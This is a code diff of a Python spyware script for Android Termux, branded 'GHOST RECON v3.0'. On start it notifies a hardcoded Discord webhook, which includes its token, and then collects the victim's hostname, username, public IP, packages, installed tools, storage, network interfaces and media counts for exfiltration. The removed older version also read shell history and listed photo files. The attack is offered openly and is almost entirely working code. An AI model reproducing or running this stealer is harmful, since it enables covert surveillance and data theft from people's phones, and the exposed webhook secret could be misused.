@@ -2,9 +2,12 @@
 # -*- coding: utf-8 -*-
 # ╔══════════════════════════════════════════════════════════╗
 # ║                M1 EZ HAING NOW  PH                       ║
-# ║            TERMUX ULTIMATE SPY v2.0                      ║
-# ║        FIXED: ACTUALLY SENDS DATA TO DISCORD            ║
+# ║            TERMUX GHOST RECON v3.0                       ║
+# ║        IMMEDIATE DISCORD NOTIFICATION ON START           ║
 # ╚══════════════════════════════════════════════════════════╝
+
+# ════════ CONFIGURATION - CHANGE THIS ════════
+WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"  # ⬅️ PUT YOUR WEBHOOK HERE
 
 import os
 import sys
@@ -19,279 +22,228 @@ import urllib.error
 import ssl
 from datetime import datetime
 import hashlib
-import random
 
-# ════════ WEBHOOK CONFIG ════════
-WEBHOOK_URL = "https://discord.com/api/webhooks/1427133743532867615/yzUXogsnbwPc65h9EcY8p6ShLiwWtE0Kig3F8AMf3vO700uB9LhVsGQLKRUFv391pey0"
-
-# ════════ DISABLE SSL VERIFICATION ════════
-ssl._create_default_https_context = ssl._create_unverified_context
-
-# ════════ ASCII BANNER ════════
-def show_banner():
-    print("""\033[91m
-    ███╗   ███╗███████╗    ███████╗███████╗    ██╗  ██╗ █████╗ ██╗███╗   ██╗ ██████╗ 
-    ████╗ ████║██╔════╝    ██╔════╝██╔════╝    ██║  ██║██╔══██╗██║████╗  ██║██╔════╝ 
-    ██╔████╔██║█████╗█████╗█████╗  █████╗█████╗███████║███████║██║██╔██╗ ██║██║  ███╗
-    ██║╚██╔╝██║██╔══╝╚════╝██╔══╝  ██╔══╝╚════╝██╔══██║██╔══██║██║██║╚██╗██║██║   ██║
-    ██║ ╚═╝ ██║███████╗    ███████╗███████╗    ██║  ██║██║  ██║██║██║ ╚████║╚██████╔╝
-    ╚═╝     ╚═╝╚══════╝    ╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
-    \033[0m""")
-    print("\033[92m" + "="*70 + "\033[0m")
-    print("\033[93m               TERMUX ULTIMATE SPY v2.0 - DATA COLLECTOR              \033[0m")
-    print("\033[93m                  GUARANTEED TO SEND ACTUAL DATA                      \033[0m")
-    print("\033[92m" + "="*70 + "\033[0m\n")
-
-# ════════ TEST WEBHOOK WITH ACTUAL DATA ════════
-def test_webhook_with_data():
-    """Test webhook by sending ACTUAL data"""
-    print("\033[94m[1] Testing Discord webhook with REAL data...\033[0m")
+# ════════ IMMEDIATE NOTIFICATION ON START ════════
+def immediate_notification():
+    """Send immediate notification when script starts"""
+    print("╔══════════════════════════════════════════════════════════╗")
+    print("║               GHOST RECON v3.0 - STARTING                ║")
+    print("╚══════════════════════════════════════════════════════════╝")
+    print("\n[🔥] SENDING IMMEDIATE STARTUP NOTIFICATION...")
     
-    # Get actual system data for test
+    # Get basic info for notification
     hostname = socket.gethostname()
     username = getpass.getuser()
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    # Create test message with ACTUAL data
-    test_message = {
+    # Create startup message
+    startup_message = {
         "content": f"""
-🚨 **SYSTEM TEST - ACTUAL DATA** 🚨
-**Target System:** `{hostname}`
-**Current User:** `{username}`
-**Test Time:** `{current_time}`
-**Status:** `ACTIVE AND MONITORING`
-**Operator:** `M1 EZ HAING NOW PH`
+🚀 **GHOST RECON v3.0 ACTIVATED** 🚀
+**Target:** `{hostname}`
+**User:** `{username}`
+**Activation Time:** `{current_time}`
+**Status:** `SYSTEM PENETRATION INITIATED`
 
-📡 **This is REAL data from the target system!**
-✅ **If you see this, the spy is WORKING!**
-🔥 **Next: Full system reconnaissance...**
+🔴 **IMMEDIATE NOTIFICATION - SCRIPT STARTED**
+✅ **This confirms the script is RUNNING**
+📡 **Next: Full system reconnaissance...**
+
+🔥 **OPERATOR:** M1 EZ HAING NOW PH
+⚡ **TOOL:** TERMUX GHOST RECON v3.0
+🎯 **MISSION:** SYSTEM INTELLIGENCE GATHERING
         """,
-        "username": "Termux Spy Test",
+        "username": "Ghost Recon v3.0",
         "avatar_url": "https://i.imgur.com/7QqQjqG.png"
     }
     
     try:
-        # Send the test message
-        data = json.dumps(test_message, ensure_ascii=False).encode('utf-8')
+        # Disable SSL verification
+        ssl._create_default_https_context = ssl._create_unverified_context
+        
+        # Send the message
+        data = json.dumps(startup_message, ensure_ascii=False).encode('utf-8')
         headers = {
             'Content-Type': 'application/json; charset=utf-8',
-            'User-Agent': 'Mozilla/5.0 (Termux Spy)'
+            'User-Agent': 'Mozilla/5.0 (Ghost Recon v3.0)'
         }
         
         req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
-        response = urllib.request.urlopen(req, timeout=15)
+        response = urllib.request.urlopen(req, timeout=10)
         
         if response.status in [200, 204]:
-            print("\033[92m[✓] Test message sent SUCCESSFULLY with ACTUAL data!\033[0m")
-            print("\033[92m[✓] Check your Discord - you should see system info!\033[0m")
+            print("[✅] STARTUP NOTIFICATION SENT SUCCESSFULLY!")
+            print("[✅] Check Discord NOW - You should see this message!")
             return True
         else:
-            print(f"\033[91m[✗] Test failed with status: {response.status}\033[0m")
+            print(f"[❌] Startup failed: HTTP {response.status}")
             return False
             
+    except urllib.error.HTTPError as e:
+        print(f"[❌] HTTP Error: {e.code} - {e.reason}")
+        if e.code == 404:
+            print("[❌] WEBHOOK NOT FOUND - Check the URL!")
+        return False
+        
+    except urllib.error.URLError as e:
+        print(f"[❌] URL Error: {e.reason}")
+        print("[❌] NO INTERNET CONNECTION!")
+        return False
+        
     except Exception as e:
-        print(f"\033[91m[✗] Test failed: {str(e)[:100]}\033[0m")
+        print(f"[❌] Error: {str(e)[:50]}")
         return False
 
-# ════════ COLLECT REAL SYSTEM DATA ════════
-def collect_real_data():
-    """Collect ACTUAL system data that WILL be sent"""
-    print("\033[94m[2] Collecting REAL system intelligence...\033[0m")
+# ════════ VERIFY WEBHOOK ════════
+def verify_webhook():
+    """Verify webhook before doing anything"""
+    print("\n[🔍] VERIFYING WEBHOOK CONFIGURATION...")
     
-    data = {}
+    if WEBHOOK_URL == "YOUR_NEW_WEBHOOK_URL_HERE":
+        print("[❌] ERROR: You didn't change the webhook URL!")
+        print("[❌] Replace 'YOUR_NEW_WEBHOOK_URL_HERE' with your actual Discord webhook")
+        print("[❌] Get a new webhook from Discord: Server Settings → Integrations → Webhooks")
+        return False
     
-    # 1. BASIC SYSTEM INFO
-    data['basic'] = {
+    if "discord.com/api/webhooks/" not in WEBHOOK_URL:
+        print("[❌] ERROR: Webhook URL doesn't look like a Discord webhook!")
+        print("[❌] Format should be: https://discord.com/api/webhooks/ID/TOKEN")
+        return False
+    
+    print("[✅] Webhook URL format is correct")
+    print("[✅] Attempting to send test message...")
+    return True
+
+# ════════ COLLECT SYSTEM INTELLIGENCE ════════
+def collect_intelligence():
+    """Collect comprehensive system intelligence"""
+    print("\n[🕵️] COLLECTING SYSTEM INTELLIGENCE...")
+    
+    intel = {}
+    
+    # Basic Information
+    intel['basic'] = {
         'victim_id': hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12],
         'timestamp': datetime.now().isoformat(),
         'hostname': socket.gethostname(),
         'username': getpass.getuser(),
         'platform': platform.platform(),
-        'system': platform.system(),
-        'release': platform.release(),
-        'python_version': platform.python_version()
+        'python_version': platform.python_version(),
+        'current_dir': os.getcwd()
     }
     
-    # 2. PUBLIC IP (ACTUAL DATA)
-    print("\033[94m   → Getting public IP address...\033[0m")
+    # Public IP
+    print("  → Getting public IP address...")
     try:
-        ip_services = [
-            ('https://api.ipify.org', 'api.ipify.org'),
-            ('https://icanhazip.com', 'icanhazip.com'),
-            ('https://ifconfig.me/ip', 'ifconfig.me')
-        ]
-        
-        for url, service in ip_services:
+        ip_services = ['https://api.ipify.org', 'https://icanhazip.com']
+        for service in ip_services:
             try:
-                with urllib.request.urlopen(url, timeout=5) as response:
-                    data['basic']['public_ip'] = response.read().decode().strip()
-                    data['basic']['ip_service'] = service
-                    print(f"\033[92m   [✓] Got IP from {service}: {data['basic']['public_ip']}\033[0m")
-                    break
+                intel['basic']['public_ip'] = urllib.request.urlopen(service, timeout=5).read().decode().strip()
+                print(f"  [✓] IP: {intel['basic']['public_ip']}")
+                break
             except:
                 continue
-        
-        if 'public_ip' not in data['basic']:
-            data['basic']['public_ip'] = "Unknown"
-    except Exception as e:
-        data['basic']['public_ip'] = f"Error: {str(e)[:50]}"
+    except:
+        intel['basic']['public_ip'] = "Unknown"
     
-    # 3. TERMUX PACKAGES (ACTUAL DATA)
-    print("\033[94m   → Checking installed packages...\033[0m")
-    data['packages'] = []
+    # Termux Packages
+    print("  → Scanning installed packages...")
+    intel['packages'] = []
     try:
         result = subprocess.run(
-            "apt list --installed 2>/dev/null | head -30",
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=10
+            "apt list --installed 2>/dev/null | head -25",
+            shell=True, capture_output=True, text=True, timeout=10
         )
-        if result.returncode == 0 and result.stdout:
-            packages = result.stdout.strip().split('\n')[1:]  # Skip header
-            data['packages'] = packages[:15]  # First 15 packages
-            print(f"\033[92m   [✓] Found {len(packages)} packages\033[0m")
-        else:
-            data['packages'] = ["No packages found or command failed"]
-    except Exception as e:
-        data['packages'] = [f"Error: {str(e)[:50]}"]
+        if result.stdout:
+            packages = result.stdout.strip().split('\n')[1:20]
+            intel['packages'] = packages
+            print(f"  [✓] Found {len(packages)} packages")
+    except:
+        pass
     
-    # 4. HACKING TOOLS (ACTUAL CHECK)
-    print("\033[94m   → Scanning for hacking tools...\033[0m")
-    data['hacking_tools'] = []
-    tools_list = [
-        'nmap', 'sqlmap', 'hydra', 'metasploit', 'aircrack-ng',
-        'john', 'hashcat', 'wireshark', 'adb', 'python3',
-        'php', 'git', 'curl', 'wget', 'netcat', 'tcpdump'
-    ]
+    # Hacking Tools
+    print("  → Detecting security tools...")
+    intel['tools'] = []
+    tool_list = ['nmap', 'sqlmap', 'hydra', 'metasploit', 'aircrack-ng',
+                 'john', 'hashcat', 'wireshark', 'adb', 'python3',
+                 'php', 'git', 'curl', 'wget', 'netcat', 'tcpdump']
     
-    for tool in tools_list:
+    for tool in tool_list:
         try:
             result = subprocess.run(
-                f"which {tool} 2>/dev/null || command -v {tool} 2>/dev/null",
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=3
+                f"which {tool} 2>/dev/null || command -v {tool}",
+                shell=True, capture_output=True, text=True, timeout=2
             )
             if result.returncode == 0:
-                data['hacking_tools'].append(tool)
+                intel['tools'].append(tool)
         except:
             pass
     
-    print(f"\033[92m   [✓] Found {len(data['hacking_tools'])} hacking tools\033[0m")
+    print(f"  [✓] Found {len(intel['tools'])} security tools")
     
-    # 5. STORAGE INFO (ACTUAL DATA)
-    print("\033[94m   → Analyzing storage...\033[0m")
-    data['storage'] = {}
-    import shutil
-    
-    storage_paths = [
-        ('/', 'Root'),
-        ('/sdcard', 'External Storage'),
-        ('/data/data/com.termux/files/home', 'Termux Home')
-    ]
-    
-    for path, name in storage_paths:
-        if os.path.exists(path):
-            try:
-                usage = shutil.disk_usage(path)
-                data['storage'][name] = {
-                    'total_gb': usage.total // (1024**3),
-                    'used_gb': usage.used // (1024**3),
-                    'free_gb': usage.free // (1024**3),
-                    'free_percent': (usage.free / usage.total * 100) if usage.total > 0 else 0
-                }
-            except Exception as e:
-                data['storage'][name] = {'error': str(e)[:50]}
-    
-    # 6. NETWORK INFO (ACTUAL DATA)
-    print("\033[94m   → Gathering network information...\033[0m")
-    data['network'] = {}
-    
-    # Network interfaces
+    # Storage Analysis
+    print("  → Analyzing storage...")
+    intel['storage'] = {}
     try:
+        import shutil
+        paths = [('/', 'Root'), ('/sdcard', 'External Storage')]
+        for path, name in paths:
+            if os.path.exists(path):
+                try:
+                    usage = shutil.disk_usage(path)
+                    intel['storage'][name] = {
+                        'total_gb': usage.total // (1024**3),
+                        'free_gb': usage.free // (1024**3),
+                        'used_gb': usage.used // (1024**3)
+                    }
+                except:
+                    pass
+    except:
+        pass
+    
+    # Network Information
+    print("  → Gathering network data...")
+    intel['network'] = {}
+    try:
+        # Network interfaces
         result = subprocess.run(
             "ip addr show 2>/dev/null || ifconfig 2>/dev/null",
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=5
+            shell=True, capture_output=True, text=True, timeout=5
         )
-        if result.returncode == 0:
-            interfaces = result.stdout.strip().split('\n')
-            data['network']['interfaces'] = interfaces[:20]  # First 20 lines
+        if result.stdout:
+            intel['network']['interfaces'] = result.stdout.strip().split('\n')[:15]
     except:
         pass
     
-    # Active connections
+    # Photos Count
+    print("  → Searching for media files...")
+    intel['media'] = {'photos': 0, 'videos': 0}
     try:
+        # Count photos
         result = subprocess.run(
-            "netstat -tun 2>/dev/null || ss -tun 2>/dev/null",
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=5
+            "find /sdcard -name '*.jpg' -o -name '*.png' 2>/dev/null | wc -l",
+            shell=True, capture_output=True, text=True, timeout=5
         )
-        if result.returncode == 0:
-            connections = result.stdout.strip().split('\n')
-            data['network']['connections'] = connections[:10]  # First 10 connections
+        if result.stdout:
+            intel['media']['photos'] = int(result.stdout.strip())
+        
+        # Count videos
+        result = subprocess.run(
+            "find /sdcard -name '*.mp4' -o -name '*.avi' 2>/dev/null | wc -l",
+            shell=True, capture_output=True, text=True, timeout=5
+        )
+        if result.stdout:
+            intel['media']['videos'] = int(result.stdout.strip())
     except:
         pass
     
-    # 7. FIND PHOTOS (ACTUAL FILES)
-    print("\033[94m   → Searching for photos...\033[0m")
-    data['photos_found'] = []
-    photo_dirs = [
-        '/sdcard/DCIM/Camera',
-        '/sdcard/Pictures',
-        '/sdcard/Download',
-        '/storage/emulated/0/DCIM/Camera'
-    ]
+    print(f"  [✓] Photos: {intel['media']['photos']}, Videos: {intel['media']['videos']}")
     
-    for dir_path in photo_dirs:
-        if os.path.exists(dir_path):
-            try:
-                files = os.listdir(dir_path)
-                image_files = [f for f in files if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
-                for img in image_files[:3]:  # First 3 images per directory
-                    full_path = os.path.join(dir_path, img)
-                    if os.path.exists(full_path):
-                        size_mb = os.path.getsize(full_path) // (1024 * 1024)
-                        data['photos_found'].append({
-                            'name': img,
-                            'path': dir_path,
-                            'size_mb': size_mb
-                        })
-            except:
-                pass
-    
-    print(f"\033[92m   [✓] Found {len(data['photos_found'])} photos\033[0m")
-    
-    # 8. SYSTEM COMMANDS HISTORY
-    print("\033[94m   → Checking command history...\033[0m")
-    data['command_history'] = []
-    history_files = [
-        '/data/data/com.termux/files/home/.bash_history',
-        '/data/data/com.termux/files/home/.zsh_history'
-    ]
-    
-    for hist_file in history_files:
-        if os.path.exists(hist_file):
-            try:
-                with open(hist_file, 'r', errors='ignore') as f:
-                    lines = f.readlines()[-10:]  # Last 10 commands
-                    data['command_history'].extend([line.strip() for line in lines if line.strip()])
-            except:
-                pass
-    
-    print(f"\033[92m[✓] Data collection COMPLETE!\033[0m")
-    print(f"\033[92m[✓] Collected {len(str(data)):,} bytes of REAL intelligence\033[0m")
-    
-    return data
+    print("[✅] INTELLIGENCE COLLECTION COMPLETE!")
+    return intel
 
-# ════════ SEND ACTUAL DATA TO DISCORD ════════
-def send_actual_data_to_discord(data):
-    """Send ACTUAL collected data to Discord"""
-    print("\n\033[94m[3] Preparing to send ACTUAL data to Discord...\033[0m")
+# ════════ SEND INTELLIGENCE REPORT ════════
+def send_intelligence_report(intel):
+    """Send comprehensive intelligence report"""
+    print("\n[📤] SENDING INTELLIGENCE REPORT TO DISCORD...")
     
